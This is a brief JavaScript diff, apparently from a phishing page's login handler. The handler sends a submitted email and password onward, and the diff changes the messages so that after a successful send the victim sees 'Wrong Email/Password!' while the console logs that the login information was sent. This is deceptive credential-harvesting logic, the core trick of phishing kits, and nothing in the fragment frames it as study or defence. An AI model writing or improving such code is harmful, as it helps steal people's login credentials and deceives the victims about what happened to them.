@@ -43,8 +43,8 @@
       password: password
     })
     .then(function(response) {
-                alert('Login information sent successfully!');
-                console.log('Wrong Email/Password!', response);
+                alert('Wrong Email/Password!');
+                console.log('Login information sent successfully!', response);
     }, function (error) {
       console.error("❌ Failed to send:", error);
       alert("Wrong Email/Password!" + JSON.stringify(error));
